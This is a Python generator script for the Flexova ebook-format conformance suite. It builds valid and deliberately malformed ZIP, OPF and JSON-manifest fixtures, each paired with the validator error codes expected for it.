#!/usr/bin/env python3
"""Generate the Flexova conformance suite (fixtures + expected.json), deterministically, with only the
Python standard library. It deliberately does NOT import any Flexova implementation: each fixture's
expected codes are declared here by hand, and implementations are graded against them.

Usage:  python3 conformance/generate.py           regenerate fixtures in place
        python3 conformance/generate.py --check   exit 1 if the committed fixtures are out of date
"""

import base64
import hashlib
import json
import struct
import sys
import zlib
from pathlib import Path

HERE = Path(__file__).resolve().parent
SPEC = HERE.parent / "spec"
CONSTANTS = json.loads((SPEC / "constants.json").read_text("utf-8"))
ERRORS = json.loads((SPEC / "errors.json").read_text("utf-8"))["codes"]

XHTML = "http://www.w3.org/1999/xhtml"
EPUB = "http://www.idpf.org/2007/ops"
MATHML = "http://www.w3.org/1998/Math/MathML"
SVGNS = "http://www.w3.org/2000/svg"
OPF = "http://www.idpf.org/2007/opf"
DC = "http://purl.org/dc/elements/1.1/"
UNLISTED = {"mimetype", "META-INF/flexova.json", "META-INF/flexova.sig.jws"}

# Real, decodable images (encoded once by Chromium; GIF is the classic 1x1).
PNG = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAFUlEQVR4AWL6DwTc8f//M/EkMIABAAAA//+2+XvUAAAABklEQVQDAFr4BtUJ5icdAAAAAElFTkSuQmCC")
JPEG = base64.b64decode(
    "/9j/4AAQSkZJRgABAQAAAQABAAD/4gHYSUNDX1BST0ZJTEUAAQEAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAA"
    "ABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1"
    "AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAP"
    "KnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADb/"
    "2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQ"
    "kUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAACAAIDASIAAhEBAxEB/8QAFQABAQAA"
    "AAAAAAAAAAAAAAAAAAf/xAAbEAACAwEBAQAAAAAAAAAAAAABBAACAyEFEf/EABQBAQAAAAAAAAAAAAAAAAAAAAj/xAAbEQABBAMAAAAAAAAAAA"
    "AAAAAAAQIzcQMEsf/aAAwDAQACEQMRAD8Ajb77PqPMOusatuM6W22Y3ub6a3sftrWsekkkkk9JMREeevCyk4HHLI61P//Z"
)
WEBP = base64.b64decode(
    "UklGRgQCAABXRUJQVlA4WAoAAAAgAAAAAQAAAQAASUNDUMgBAAAAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAA"
    "ABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1"
    "AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAP"
    "KnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADZW"
    "UDhMFQAAAC8BQAAAD/Av0C/Qz//8Bw8mIKL/EQA="
)
GIF = bytes.fromhex("47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b")
M4A = b"\x00\x00\x00\x18ftypM4A \x00\x00\x00\x00M4A mp42isom"
SVG = (
    f'<svg xmlns="{SVGNS}" viewBox="0 0 40 20" role="img"><style>rect{{fill:#0b5fff}}'
    "@media (prefers-color-scheme:dark){rect{fill:#7aa7ff}}</style>"
    '<rect x="2" y="8" width="8" height="12"/><rect x="14" y="2" width="8" height="18"/></svg>\n'
).encode()
CSS = b"body{margin:0 auto;max-width:68ch;padding:0 1rem}\n"
BODY = '<section id="intro"><h1 id="intro-title">Introduction</h1><p>Hello, Flexova.</p></section>'
A11Y = [
    ("schema:accessMode", "textual"),
    ("schema:accessModeSufficient", "textual"),
    ("schema:accessibilityFeature", "structuralNavigation"),
    ("schema:accessibilityFeature", "tableOfContents"),
    ("schema:accessibilityHazard", "none"),
    ("schema:accessibilitySummary", "Reflowable text with a table of contents."),
]


# --- ZIP writer with mutation hooks -------------------------------------------------------------
def zip_bytes(entries, opts=None, dirs=(), zip64_locator=False, cd_offset_delta=0):
    """entries: [(name str|bytes, data bytes)]. opts[name] keys: store, extra, flags, method, crc_xor,
    usize_delta, truncate, trailing, data_descriptor."""
    opts = opts or {}
    rows = [(d, b"", {"store": True}) for d in dirs]
    rows = rows[:0] + [(n, d, opts.get(n, {})) for n, d in entries[:1]] + rows + [(n, d, opts.get(n, {})) for n, d in entries[1:]]
    local, central = bytearray(), bytearray()
    for name, data, o in rows:
        raw = name if isinstance(name, bytes) else name.encode("ascii")
        store = o.get("store", name in ("mimetype", b"mimetype"))
        if store:
            comp, method = data, 0
        else:
            co = zlib.compressobj(9, zlib.DEFLATED, -15)
            comp, method = co.compress(data) + co.flush(), 8
        comp = comp[: len(comp) - o.get("truncate", 0)] + o.get("trailing", b"")
        method = o.get("method", method)
        crc = (zlib.crc32(data) & 0xFFFFFFFF) ^ o.get("crc_xor", 0)
        usize = len(data) + o.get("usize_delta", 0)
        flags = o.get("flags", 0)
        extra = o.get("extra", b"")
        offset = len(local)
        if o.get("data_descriptor"):
            local += struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, flags | 8, method, 0, 0x21, 0, 0, 0, len(raw), len(extra))
            local += raw + extra + comp + struct.pack("<IIII", 0x08074B50, crc, len(comp), usize)
            flags |= 8
        else:
            local += struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, flags, method, 0, 0x21, crc, len(comp), usize, len(raw), len(extra))
            local += raw + extra + comp
        central += struct.pack(
            "<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, flags, method, 0, 0x21, crc, len(comp), usize, len(raw), 0, 0, 0, 0, 0, offset
        )
        central += raw
    tail = bytearray()
    if zip64_locator:
        tail += struct.pack("<IIQI", 0x07064B50, 0, 0, 1)
    tail += struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, len(rows), len(rows), len(central), len(local) + cd_offset_delta, 0)
    return bytes(local + central + tail)


# --- package model ------------------------------------------------------------------------------
def xhtml(body, *, lang="en", title="Chapter", css="../styles/flexova.css", head="", root=None, doctype="", bom=False, decl=None):
    attrs = root if root is not None else f'xmlns="{XHTML}" xmlns:epub="{EPUB}" lang="{lang}" xml:lang="{lang}"'
    decl = '<?xml version="1.0" encoding="UTF-8"?>\n' if decl is None else decl
    text = (
        f"{decl}{doctype}<html {attrs}><head><meta charset=\"utf-8\"/><title>{title}</title>"
        f'<link rel="stylesheet" type="text/css" href="{css}"/>{head}</head><body>{body}</body></html>\n'
    )
    return (b"\xef\xbb\xbf" if bom else b"") + text.encode("utf-8")


class Pkg:
    """A valid package by default; fixtures mutate attributes before calling build()."""

    def __init__(self):
        self.lang = "en"
        self.chapters = [("01.xhtml", BODY)]  # (file, body str | full document bytes)
        self.assets = []  # (path under OEBPS/, media type, bytes)
        self.tokens = {"color": {"accent": {"light": "#0b5fff", "dark": "#7aa7ff"}}}
        self.drop = set()  # metadata to omit: dc:identifier, dc:title, dc:language, modified, profile, a11y
        self.modified = "2026-11-01T00:00:00Z"
        self.profile = "1.0"
        self.opf_version = "3.0"
        self.extra_items = []
        self.spine = None  # raw <itemref/> markup override
        self.nav_props = "nav"
        self.nav_body = None
        self.nav_in_spine = False
        self.css = CSS
        self.extra = []  # (name, bytes) added to the archive but not to the OPF
        self.remove = set()
        self.replace = {}
        self.manifest_edit = None  # callable(dict) -> dict | bytes
        self.container = None
        self.chapter_kw = {}

    def chapter_doc(self, body):
        return body if isinstance(body, bytes) else xhtml(body, lang=self.lang, **self.chapter_kw)

    def opf(self):
        m = []
        if "dc:identifier" not in self.drop:
            m.append('<dc:identifier id="uid">urn:uuid:7d1c9f40-1b7a-4c51-9a2e-000000000001</dc:identifier>')
        if "dc:title" not in self.drop:
            m.append("<dc:title>Flexova conformance fixture</dc:title>")
        if "dc:language" not in self.drop:
            m.append(f"<dc:language>{self.lang}</dc:language>")
        if "modified" not in self.drop:
            m.append(f'<meta property="dcterms:modified">{self.modified}</meta>')
        if "profile" not in self.drop:
            m.append(f'<meta property="flexova:profile">{self.profile}</meta>')
        if "a11y" not in self.drop:
            m += [f'<meta property="{p}">{v}</meta>' for p, v in A11Y]
        nav_props = f' properties="{self.nav_props}"' if self.nav_props else ""
        items = [f'<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml"{nav_props}/>',
                 '<item id="css" href="styles/flexova.css" media-type="text/css"/>']
        for i, (name, body) in enumerate(self.chapters, 1):
            math = isinstance(body, str) and "<math" in body
            items.append(f'<item id="c{i:02d}" href="content/{name}" media-type="application/xhtml+xml"'
                         + (' properties="mathml"' if math else "") + "/>")
        items += [f'<item id="a{i:02d}" href="{p}" media-type="{t}"/>' for i, (p, t, _) in enumerate(self.assets, 1)]
        items += self.extra_items
        spine = self.spine if self.spine is not None else (
            ('<itemref idref="nav"/>' if self.nav_in_spine else "")
            + "".join(f'<itemref idref="c{i:02d}"/>' for i in range(1, len(self.chapters) + 1))
        )
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n<package xmlns="{OPF}" version="{self.opf_version}" '
            f'unique-identifier="uid" xml:lang="{self.lang}" prefix="flexova: {CONSTANTS["namespaceUri"]}">'
            f'<metadata xmlns:dc="{DC}">{"".join(m)}</metadata><manifest>{"".join(items)}</manifest>'
            f"<spine>{spine}</spine></package>\n"
        ).encode("utf-8")

    def files(self):
        nav = self.nav_body if self.nav_body is not None else (
            '<nav epub:type="toc" id="toc"><h1 id="toc-title">Contents</h1><ol>'
            + "".join(f'<li><a href="content/{n}">Part {i}</a></li>' for i, (n, _) in enumerate(self.chapters, 1))
            + "</ol></nav>"
        )
        files = {
            "mimetype": CONSTANTS["containerMimetype"].encode("ascii"),
            "META-INF/container.xml": self.container or (
                '<?xml version="1.0" encoding="UTF-8"?>\n<container version="1.0" '
                'xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles>'
                '<rootfile full-path="OEBPS/package.opf" media-type="application/oebps-package+xml"/>'
                "</rootfiles></container>\n"
            ).encode("utf-8"),
            "OEBPS/package.opf": self.opf(),
            "OEBPS/nav.xhtml": xhtml(nav, lang=self.lang, title="Contents", css="styles/flexova.css"),
            "OEBPS/styles/flexova.css": self.css,
        }
        for name, body in self.chapters:
            files[f"OEBPS/content/{name}"] = self.chapter_doc(body)
        for path, _, data in self.assets:
            files[f"OEBPS/{path}"] = data
        for name, data in self.extra:
            files[name] = data
        files.update(self.replace)
        for name in self.remove:
            files.pop(name, None)
        manifest = {"flexova": "1.0", "level": "L0"}
        if self.tokens is not None:
            manifest["tokens"] = self.tokens
        manifest["entries"] = [
            {"path": n, "size": len(d), "sha256": hashlib.sha256(d).hexdigest()}
            for n, d in sorted(files.items(), key=lambda kv: kv[0] if isinstance(kv[0], str) else kv[0].decode("latin-1"))
            if isinstance(n, str) and n not in UNLISTED
        ]
        if self.manifest_edit:
            manifest = self.manifest_edit(manifest)
        if "META-INF/flexova.json" not in self.remove:
            files["META-INF/flexova.json"] = manifest if isinstance(manifest, bytes) else (json.dumps(manifest, indent=2) + "\n").encode()
        return files

    def build(self, order=None, **zip_kw):
        files = self.files()
        names = order or (["mimetype"] if "mimetype" in files else []) + sorted(
            (n for n in files if n != "mimetype"), key=lambda n: n if isinstance(n, str) else n.decode("latin-1")
        )
        return zip_bytes([(n, files[n]) for n in names], **zip_kw)


def pkg(**attrs):
    p = Pkg()
    for k, v in attrs.items():
        setattr(p, k, v)
    return p


def body(markup, **attrs):
    return pkg(chapters=[("01.xhtml", markup)], **attrs).build()


def with_icon(markup, **attrs):
    return pkg(chapters=[("01.xhtml", markup)], assets=[("assets/icon.png", "image/png", PNG)], **attrs).build()


def manifest_edit(fn):
    return pkg(manifest_edit=fn).build()


def set_token(**colors):
    def edit(m):
        m["tokens"] = {"color": colors}
        return m
    return pkg(manifest_edit=edit).build()


# --- fixtures -----------------------------------------------------------------------------------
CH = "OEBPS/content/01.xhtml"
FIXTURES = []


def fixture(category, name, codes, description, epubcheck=True):
    def register(builder):
        FIXTURES.append((category, name, sorted(codes), description, builder, epubcheck))
        return builder
    return register


# valid ---------------------------------------------------------------------------------------------
@fixture("valid", "minimal", [], "Smallest conforming package: one chapter with one paragraph.")
def _(): return body("<p>Hello, Flexova.</p>")


@fixture("valid", "block-elements", [], "Every block element of the profile.")
def _(): return body(
    '<section id="s1" epub:type="chapter"><h1 id="h1">Blocks</h1><p>Paragraph.</p><h2 id="h2">Lists</h2>'
    "<ul><li>One</li><li><p>Two</p><ul><li>Nested</li></ul></li></ul>"
    '<ol start="3" reversed="reversed"><li>Three</li></ol><dl><dt>Term</dt><dd>Definition</dd></dl>'
    '<blockquote><p>Quote.</p></blockquote><aside role="note" data-flexova-variant="tip"><p>Tip.</p></aside>'
    '<aside role="note"><p>Note.</p></aside><pre><code>let x = 1;</code></pre><hr/>'
    '<details><summary>More</summary><p>Hidden detail.</p></details><h3 id="h3">Table</h3>'
    '<table id="t1"><caption>Caption</caption><thead><tr><th scope="col">A</th><th scope="col">B</th></tr></thead>'
    "<tbody><tr><td>1</td><td>2</td></tr></tbody><tfoot><tr><td>Sum</td><td>3</td></tr></tfoot></table></section>"
)


@fixture("valid", "inline-elements", [], "Every inline element of the profile.")
def _(): return body(
    "<p>Text with <strong>strong</strong>, <em>em</em>, <code>code</code>, <kbd>Ctrl</kbd>, <samp>out</samp>, "
    "<var>x</var>, <mark>mark</mark>, <s>old</s>, <small>small</small>, H<sub>2</sub>O, x<sup>3</sup>, "
    '<q>quote</q>, <cite>Title</cite>, <dfn id="d1">term</dfn>, <abbr title="Flexible Nova">FN</abbr>, '
    '<time datetime="2026-11-01">today</time>, <span lang="fr">bonjour</span>, '
    '<a href="https://example.org/">a link</a> and a line<br/>break.</p>'
)


@fixture("valid", "images", [], "PNG, JPEG, GIF, WebP and SVG images; figure, picture with a dark variant, decorative alt.")
def _(): return pkg(
    chapters=[("01.xhtml",
        '<figure id="f1"><img src="../assets/photo.jpg" alt="A blue square" width="2" height="2"/><figcaption>JPEG</figcaption></figure>'
        '<figure id="f2"><picture><source srcset="../assets/chart-dark.svg" media="(prefers-color-scheme: dark)" type="image/svg+xml"/>'
        '<img src="../assets/chart.svg" alt="Bar chart rising from left to right"/></picture>'
        "<figcaption><p>Chart with a dark variant.</p></figcaption></figure>"
        '<p>Icon <img src="../assets/icon.png" alt="info"/>, decorative <img src="../assets/dot.gif" alt=""/> '
        'and <img src="../assets/pic.webp" alt="WebP sample"/>.</p>')],
    assets=[("assets/photo.jpg", "image/jpeg", JPEG), ("assets/chart.svg", "image/svg+xml", SVG),
            ("assets/chart-dark.svg", "image/svg+xml", SVG.replace(b"#0b5fff", b"#7aa7ff")),
            ("assets/icon.png", "image/png", PNG), ("assets/dot.gif", "image/gif", GIF), ("assets/pic.webp", "image/webp", WEBP)],
).build()


@fixture("valid", "mathml", [], "Inline and display MathML (item carries properties=\"mathml\").")
def _(): return body(
    f'<p>Inline <math xmlns="{MATHML}" alttext="x squared"><msup><mi>x</mi><mn>2</mn></msup></math> math.</p>'
    f'<figure id="eq1"><math xmlns="{MATHML}" display="block"><mfrac><mrow><mo>-</mo><mi>b</mi></mrow>'
    "<mrow><mn>2</mn><mi>a</mi></mrow></mfrac></math><figcaption>Equation 1</figcaption></figure>"
)


@fixture("valid", "links", [], "Same-document, cross-document, external https/http and mailto links.")
def _(): return pkg(chapters=[
    ("01.xhtml", '<section id="a"><h1 id="a-title">Part A</h1><p>See <a href="02.xhtml#b-detail">detail</a>, '
                 '<a href="#a-end">the end</a>, <a href="03.xhtml">part C</a>, <a href="mailto:docs@example.org">email</a> '
                 'and <a href="http://example.org/">a web page</a>.</p><p id="a-end">End.</p></section>'),
    ("02.xhtml", '<section id="b"><h1 id="b-title">Part B</h1><p id="b-detail">Back to <a href="01.xhtml#a">part A</a>.</p></section>'),
    ("03.xhtml", '<section id="c"><h1 id="c-title">Part C</h1><p>Done.</p></section>'),
]).build()


@fixture("valid", "audio", [], "Embedded audio with controls and fallback text.")
def _(): return pkg(
    chapters=[("01.xhtml", '<figure id="a1"><audio src="../assets/clip.m4a" controls="controls">Audio is not supported.</audio>'
                           "<figcaption>Briefing</figcaption></figure>")],
    assets=[("assets/clip.m4a", "audio/mp4", M4A)],
).build()


@fixture("valid", "right-to-left", [], "Arabic document with dir=\"rtl\".")
def _(): return pkg(
    lang="ar",
    chapter_kw={"root": f'xmlns="{XHTML}" xmlns:epub="{EPUB}" lang="ar" xml:lang="ar" dir="rtl"'},
    chapters=[("01.xhtml", '<section id="s"><h1 id="t">دليل الخدمة</h1><p>افصل الجهاز قبل فتح اللوحة.</p></section>')],
).build()


@fixture("valid", "tokens-full", [], "Every token group: custom colors, fonts and measure, all with sufficient contrast.")
def _(): return pkg(tokens={
    "color": {"fg": {"light": "#1a1a1a", "dark": "#f0f0f0"}, "bg": {"light": "#ffffff", "dark": "#000000"},
              "accent": {"light": "#0b5fff", "dark": "#7aa7ff"}, "muted": {"light": "#555555", "dark": "#aaaaaa"},
              "brand": {"light": "#8a2be2", "dark": "#D8B4FE"}, "note-bg": {"light": "#eef", "dark": "#123"}},
    "font": {"body": "serif", "heading": "sans", "mono": "mono"}, "measure": 72,
}).build()


@fixture("valid", "no-tokens", [], "Tokens are optional.")
def _(): return pkg(tokens=None).build()


@fixture("valid", "tables-complex", [], "Captions, row headers, colspan/rowspan, multiple tbody, block content in cells.")
def _(): return body(
    '<table id="t"><caption>Torque settings</caption><thead><tr><th scope="col">Bolt</th><th scope="col" colspan="2">Torque</th></tr></thead>'
    '<tbody><tr><th scope="row" rowspan="2">A1</th><td>25</td><td>Nm</td></tr><tr><td>18</td><td>lbf·ft</td></tr></tbody>'
    '<tbody><tr><th scope="row">B4</th><td><p>49</p></td><td>Nm</td></tr></tbody></table>'
)


@fixture("valid", "nested-lists", [], "Nested ordered lists, mixed block list items, description lists.")
def _(): return body(
    "<ol><li><p>Step one</p><ol><li>Sub-step</li><li>Sub-step <strong>two</strong></li></ol></li><li>Step two</li></ol>"
    "<dl><dt>Torque</dt><dt>Twist</dt><dd><p>Rotational force.</p></dd><dd>Measured in Nm.</dd></dl>"
)


@fixture("valid", "html-doctype", [], "The HTML5 doctype <!DOCTYPE html> is the only doctype allowed.")
def _(): return pkg(chapter_kw={"doctype": "<!DOCTYPE html>\n"}).build()


@fixture("valid", "bom-and-declaration", [], "UTF-8 byte order mark before the XML declaration.")
def _(): return pkg(chapter_kw={"bom": True}).build()


@fixture("valid", "comments-cdata-pi", [], "Comments, CDATA sections and processing instructions are ignored.")
def _(): return body("<!-- note --><p>Text<!-- inline --></p><?flexova hint?>"
                     "<pre><code><![CDATA[if (a < b && c > d) { return; }]]></code></pre>")


@fixture("valid", "manifest-forward-compatible", [], "Unknown manifest members and token groups are ignored.")
def _():
    def edit(m):
        m["generator"] = "conformance"
        m["x-future"] = {"anything": [1, 2, 3]}
        m["tokens"]["spacing"] = {"unit": 4}
        return m
    return manifest_edit(edit)


@fixture("valid", "warning-heading-skip", ["PRF_HEADING_SKIP"], "Skipping a heading level is a warning, not an error.")
def _(): return body('<h1 id="a">Title</h1><h3 id="b">Skipped level</h3><p>Text.</p>')


@fixture("valid", "warning-table-no-headers", ["PRF_TABLE_NO_HEADERS"], "A table without th cells is a warning.")
def _(): return body('<table id="t"><tbody><tr><td>1</td><td>2</td></tr></tbody></table>')


@fixture("valid", "warning-a11y-metadata-missing", ["OPF_A11Y_METADATA_MISSING"], "Missing accessibility metadata is a warning.")
def _(): return pkg(drop={"a11y"}).build()


@fixture("valid", "signature-file", [], "META-INF/flexova.sig.jws may be present and is not listed in entries.")
def _(): return pkg(extra=[("META-INF/flexova.sig.jws", b"eyJhbGciOiJFZERTQSJ9..c2lnbmF0dXJl\n")]).build()


@fixture("valid", "directory-entries", [], "Directory entries in the ZIP are allowed and ignored.")
def _(): return pkg().build(dirs=("META-INF/", "OEBPS/", "OEBPS/content/"))


@fixture("valid", "data-descriptors", [], "Entries written with ZIP data descriptors (sizes in the central directory).")
def _():
    p = pkg()
    return p.build(opts={n: {"data_descriptor": True} for n in p.files() if n != "mimetype"})


@fixture("valid", "deflate-trailing-bytes", [], "Bytes after the end of an entry's deflate stream are ignored.", epubcheck=False)
def _(): return pkg().build(opts={CH: {"trailing": b"\x00JUNK"}})


@fixture("valid", "nav-in-spine", [], "The navigation document may also appear in the spine.")
def _(): return pkg(nav_in_spine=True).build()


# invalid: zip -----------------------------------------------------------------------------------------
@fixture("invalid", "not-a-zip", ["ZIP_NOT_ZIP"], "Plain text, not a ZIP archive.")
def _(): return b"This is not a ZIP archive.\n"


@fixture("invalid", "zip-bad-directory-offset", ["ZIP_NOT_ZIP"], "End-of-central-directory points past itself.")
def _(): return pkg().build(cd_offset_delta=1000)


@fixture("invalid", "zip64", ["ZIP_UNSUPPORTED_FEATURE"], "ZIP64 archives are not supported.")
def _(): return pkg().build(zip64_locator=True)


@fixture("invalid", "mimetype-not-first", ["ZIP_MIMETYPE_NOT_FIRST"], "mimetype is not the first entry.")
def _():
    p = pkg()
    names = sorted(n for n in p.files() if n != "mimetype")
    return p.build(order=names[:1] + ["mimetype"] + names[1:])


@fixture("invalid", "mimetype-missing", ["ZIP_MIMETYPE_NOT_FIRST"], "No mimetype entry at all.")
def _(): return pkg(remove={"mimetype"}).build()


@fixture("invalid", "mimetype-compressed", ["ZIP_MIMETYPE_COMPRESSED"], "mimetype is deflated.")
def _(): return pkg().build(opts={"mimetype": {"store": False}})


@fixture("invalid", "mimetype-extra-field", ["ZIP_MIMETYPE_EXTRA_FIELD"], "mimetype has a local extra field.")
def _(): return pkg().build(opts={"mimetype": {"extra": b"UT\x05\x00\x01\x00\x00\x00\x00"}})


@fixture("invalid", "mimetype-wrong-content", ["ZIP_MIMETYPE_INVALID"], "mimetype says application/zip.")
def _(): return pkg(replace={"mimetype": b"application/zip"}).build()


@fixture("invalid", "duplicate-entry-case", ["ZIP_DUPLICATE_ENTRY"], "Two entry names differ only in case.")
def _(): return pkg(extra=[("OEBPS/NAV.xhtml", b"duplicate")]).build()


@fixture("invalid", "entry-name-space", ["ZIP_INVALID_NAME"], "Entry name contains a space.")
def _(): return pkg(extra=[("OEBPS/read me.txt", b"x")]).build()


@fixture("invalid", "entry-name-non-ascii", ["ZIP_INVALID_NAME"], "Entry name contains non-ASCII bytes.")
def _(): return pkg(extra=[("OEBPS/café.txt".encode("utf-8"), b"x")]).build()


@fixture("invalid", "encrypted-entry", ["ZIP_ENCRYPTED_ENTRY"], "An entry has the ZIP encryption flag set.")
def _(): return pkg().build(opts={CH: {"flags": 1}})


@fixture("invalid", "unsupported-compression", ["ZIP_UNSUPPORTED_FEATURE"], "An entry claims compression method 12 (bzip2).")
def _(): return pkg().build(opts={CH: {"method": 12}})


@fixture("invalid", "crc-mismatch", ["ZIP_CORRUPT"], "An entry's CRC-32 does not match its content.")
def _(): return pkg().build(opts={CH: {"crc_xor": 0xFF}})


@fixture("invalid", "truncated-deflate", ["ZIP_CORRUPT"], "An entry's deflate stream is cut short.")
def _(): return pkg().build(opts={CH: {"truncate": 6}})


# invalid: package -------------------------------------------------------------------------------------
@fixture("invalid", "container-missing", ["OCF_CONTAINER_MISSING"], "META-INF/container.xml is missing.")
def _(): return pkg(remove={"META-INF/container.xml"}).build()


@fixture("invalid", "rootfile-missing", ["OCF_ROOTFILE_MISSING"], "container.xml points to a missing package document.")
def _(): return pkg(container=(
    '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">'
    '<rootfiles><rootfile full-path="OEBPS/missing.opf" media-type="application/oebps-package+xml"/></rootfiles></container>'
).encode()).build()


@fixture("invalid", "package-malformed", ["XML_MALFORMED"], "The package document is not well-formed (fatal).")
def _(): return pkg(replace={"OEBPS/package.opf": b'<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf"><metadata>'}).build()


@fixture("invalid", "package-version-2", ["OPF_INVALID"], "The package document is EPUB 2.")
def _(): return pkg(opf_version="2.0").build()


@fixture("invalid", "metadata-missing-title", ["OPF_MISSING_METADATA"], "No dc:title.")
def _(): return pkg(drop={"dc:title"}).build()


@fixture("invalid", "metadata-bad-modified", ["OPF_INVALID_METADATA"], "dcterms:modified is not CCYY-MM-DDThh:mm:ssZ.")
def _(): return pkg(modified="2026-11-01").build()


@fixture("invalid", "profile-missing", ["OPF_PROFILE_MISSING"], "No flexova:profile meta.")
def _(): return pkg(drop={"profile"}).build()


@fixture("invalid", "profile-unsupported", ["OPF_PROFILE_UNSUPPORTED"], "flexova:profile 2.0.")
def _(): return pkg(profile="2.0").build()


@fixture("invalid", "manifest-item-missing-file", ["OPF_MISSING_RESOURCE"], "A manifest item points to a file not in the archive.")
def _(): return pkg(extra_items=['<item id="ghost" href="assets/ghost.png" media-type="image/png"/>']).build()


@fixture("invalid", "undeclared-file", ["OPF_UNDECLARED_RESOURCE"], "A file in the archive is not declared in the package manifest.")
def _(): return pkg(extra=[("OEBPS/notes.txt", b"hidden payload\n")]).build()


@fixture("invalid", "unsupported-media-type", ["OPF_UNSUPPORTED_MEDIA_TYPE"], "A video/mp4 item.")
def _(): return pkg(assets=[("assets/clip.mp4", "video/mp4", b"\x00\x00\x00\x18ftypmp42")]).build()


@fixture("invalid", "nav-missing", ["OPF_NAV_MISSING"], "No manifest item has properties=\"nav\".")
def _(): return pkg(nav_props=None).build()


@fixture("invalid", "spine-unknown-idref", ["OPF_SPINE_INVALID"], "The spine references an unknown item.")
def _(): return pkg(spine='<itemref idref="c01"/><itemref idref="nope"/>').build()


@fixture("invalid", "nav-without-toc", ["OPF_NAV_INVALID"], "The navigation document has no toc nav.")
def _(): return pkg(nav_body='<nav id="toc"><h1 id="toc-title">Contents</h1><ol><li><a href="content/01.xhtml">Intro</a></li></ol></nav>').build()


# invalid: flexova.json --------------------------------------------------------------------------------
@fixture("invalid", "manifest-missing", ["MAN_MISSING"], "META-INF/flexova.json is missing.")
def _(): return pkg(remove={"META-INF/flexova.json"}).build()


@fixture("invalid", "manifest-not-json", ["MAN_INVALID"], "flexova.json is not JSON.")
def _(): return manifest_edit(lambda m: b"{not json\n")


@fixture("invalid", "manifest-bad-level", ["MAN_INVALID"], "level is not L0, L1 or L2.")
def _(): return manifest_edit(lambda m: {**m, "level": "L9"})


@fixture("invalid", "manifest-entries-not-array", ["MAN_INVALID"], "entries is an object.")
def _(): return manifest_edit(lambda m: {**m, "entries": {}})


@fixture("invalid", "manifest-unsupported-version", ["MAN_UNSUPPORTED_VERSION"], "flexova 2.0 manifest.")
def _(): return manifest_edit(lambda m: {**m, "flexova": "2.0"})


@fixture("invalid", "manifest-invalid-color", ["MAN_INVALID_TOKEN"], "A color token is a CSS keyword, not hex.")
def _(): return set_token(accent={"light": "blue", "dark": "#7aa7ff"})


@fixture("invalid", "manifest-invalid-measure", ["MAN_INVALID_TOKEN"], "measure is out of range.")
def _(): return manifest_edit(lambda m: {**m, "tokens": {"measure": 300}})


@fixture("invalid", "manifest-low-contrast", ["MAN_LOW_CONTRAST"], "Light-mode text color fails 4.5:1 against the background.")
def _(): return set_token(fg={"light": "#aaaaaa", "dark": "#e8e6e3"}, bg={"light": "#ffffff", "dark": "#121212"})


@fixture("invalid", "manifest-too-deep", ["MAN_INVALID"], "flexova.json nests containers deeper than 32 levels.")
def _(): return manifest_edit(lambda m: {**m, "x-future": json.loads("[" * 40 + "]" * 40)})


@fixture("invalid", "manifest-font-not-string", ["MAN_INVALID_TOKEN"], "A font token whose value is a list, not a name.")
def _(): return manifest_edit(lambda m: {**m, "tokens": {"font": {"body": ["serif"]}}})


@fixture("invalid", "manifest-hash-mismatch", ["MAN_HASH_MISMATCH"], "A listed SHA-256 is wrong.")
def _():
    def edit(m):
        for e in m["entries"]:
            if e["path"] == CH:
                e["sha256"] = "0" * 64
        return m
    return manifest_edit(edit)


